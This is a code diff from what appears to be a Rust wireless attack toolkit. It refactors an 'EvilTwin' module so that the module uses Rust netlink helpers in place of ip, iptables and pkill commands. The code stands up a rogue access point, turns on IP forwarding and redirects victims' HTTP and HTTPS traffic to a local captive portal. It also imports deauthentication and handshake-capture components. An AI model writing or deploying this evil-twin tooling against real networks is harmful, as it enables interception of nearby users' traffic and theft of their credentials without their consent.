@@ -23,11 +23,14 @@ use std::sync::atomic::{AtomicBool, Ordering};
 use std::sync::Arc;
 use std::thread;
 use std::time::{Duration, Instant};
+use std::net::IpAddr;
 
 use chrono::Local;
 
 use crate::deauth::{DeauthAttacker, DeauthConfig};
 use crate::error::{Result, WirelessError};
+use crate::netlink_helpers::{netlink_set_interface_down, netlink_set_interface_up, netlink_flush_addresses, netlink_add_address};
+use crate::process_helpers::{pkill_exact_force, pgrep_pattern};
 use crate::frames::MacAddress;
 use crate::handshake::HandshakeCapture;
 use crate::interface::WirelessInterface;
@@ -149,17 +152,8 @@ impl EvilTwin {
     pub fn check_requirements() -> Result<Vec<String>> {
         let mut missing = Vec::new();
 
-        let tools = ["hostapd", "dnsmasq", "iptables"];
-        for tool in tools {
-            if Command::new("which")
-                .arg(tool)
-                .output()
-                .map(|o| !o.status.success())
-                .unwrap_or(true)
-            {
-                missing.push(tool.to_string());
-            }
-        }
+        // No external tools needed - we use Rust implementations
+        // (AP, DHCP, DNS, iptables all via rustyjack-netlink)
 
         Ok(missing)
     }
@@ -272,27 +266,17 @@ impl EvilTwin {
         let iface = &self.config.ap_interface;
 
         // Bring interface down
-        Command::new("ip")
-            .args(["link", "set", iface, "down"])
-            .output()
-            .map_err(|e| WirelessError::System(format!("ip link down failed: {}", e)))?;
+        netlink_set_interface_down(iface)?;
 
         // Set IP address for AP
-        Command::new("ip")
-            .args(["addr", "flush", "dev", iface])
-            .output()
-            .ok();
-
-        Command::new("ip")
-            .args(["addr", "add", "192.168.4.1/24", "dev", iface])
-            .output()
-            .map_err(|e| WirelessError::System(format!("ip addr add failed: {}", e)))?;
+        netlink_flush_addresses(iface)?;
+        
+        let addr: IpAddr = "192.168.4.1".parse()
+            .map_err(|e| WirelessError::System(format!("Failed to parse IP: {}", e)))?;
+        netlink_add_address(iface, addr, 24)?;
 
         // Bring interface up
-        Command::new("ip")
-            .args(["link", "set", iface, "up"])
-            .output()
-            .map_err(|e| WirelessError::System(format!("ip link up failed: {}", e)))?;
+        netlink_set_interface_up(iface)?;
 
         Ok(())
     }
@@ -391,7 +375,7 @@ impl EvilTwin {
             .map_err(|e| WirelessError::System(format!("Failed to write dnsmasq.conf: {}", e)))?;
 
         // Kill any existing dnsmasq
-        Command::new("pkill").args(["-9", "dnsmasq"]).output().ok();
+        pkill_exact_force("dnsmasq").ok();
 
         let child = Command::new("dnsmasq")
             .args(["-C", &conf_path, "-d"])
@@ -414,59 +398,16 @@ impl EvilTwin {
         fs::write("/proc/sys/net/ipv4/ip_forward", "1")
             .map_err(|e| WirelessError::System(format!("Failed to enable IP forward: {}", e)))?;
 
-        // Setup iptables for captive portal
-        let commands = [
-            // Flush existing rules
-            vec!["iptables", "-t", "nat", "-F"],
-            vec!["iptables", "-F"],
-            // Redirect HTTP to our portal
-            vec![
-                "iptables",
-                "-t",
-                "nat",
-                "-A",
-                "PREROUTING",
-                "-i",
-                iface,
-                "-p",
-                "tcp",
-                "--dport",
-                "80",
-                "-j",
-                "DNAT",
-                "--to-destination",
-                "192.168.4.1:80",
-            ],
-            // Redirect HTTPS
-            vec![
-                "iptables",
-                "-t",
-                "nat",
-                "-A",
-                "PREROUTING",
-                "-i",
-                iface,
-                "-p",
-                "tcp",
-                "--dport",
-                "443",
-                "-j",
-                "DNAT",
-                "--to-destination",
-                "192.168.4.1:80",
-            ],
-            // Accept forwarding
-            vec!["iptables", "-A", "FORWARD", "-i", iface, "-j", "ACCEPT"],
-        ];
+        // Setup iptables for captive portal using Rust implementation
+        log::info!("Configuring captive portal iptables via Rust");
+        
+        let ipt = rustyjack_netlink::IptablesManager::new()
+            .map_err(|e| WirelessError::System(format!("Failed to create iptables manager: {}", e)))?;
+        
+        ipt.setup_captive_portal(iface, "192.168.4.1", 80)
+            .map_err(|e| WirelessError::System(format!("Failed to setup captive portal: {}", e)))?;
 
-        for cmd in commands {
-            Command::new(cmd[0])
-                .args(&cmd[1..])
-                .output()
-                .map_err(|e| WirelessError::System(format!("iptables failed: {}", e)))?;
-        }
-
-        log::info!("Captive portal iptables configured");
+        log::info!("Captive portal configured successfully");
         Ok(())
     }
 
@@ -545,26 +486,19 @@ impl EvilTwin {
         }
 
         // Also pkill in case they're orphaned
-        Command::new("pkill").args(["-9", "hostapd"]).output().ok();
-        Command::new("pkill").args(["-9", "dnsmasq"]).output().ok();
+        pkill_exact_force("hostapd").ok();
+        pkill_exact_force("dnsmasq").ok();
 
-        // Flush iptables
-        Command::new("iptables")
-            .args(["-t", "nat", "-F"])
-            .output()
-            .ok();
-        Command::new("iptables").args(["-F"]).output().ok();
+        // Flush iptables using Rust implementation
+        if let Ok(ipt) = rustyjack_netlink::IptablesManager::new() {
+            let _ = ipt.flush_table(rustyjack_netlink::Table::Nat);
+            let _ = ipt.flush_table(rustyjack_netlink::Table::Filter);
+        }
 
         // Reset interface
         let iface = &self.config.ap_interface;
-        Command::new("ip")
-            .args(["addr", "flush", "dev", iface])
-            .output()
-            .ok();
-        Command::new("ip")
-            .args(["link", "set", iface, "down"])
-            .output()
-            .ok();
+        let _ = netlink_flush_addresses(iface);
+        let _ = netlink_set_interface_down(iface);
 
         // Restart NetworkManager to restore normal operation
         Command::new("systemctl")
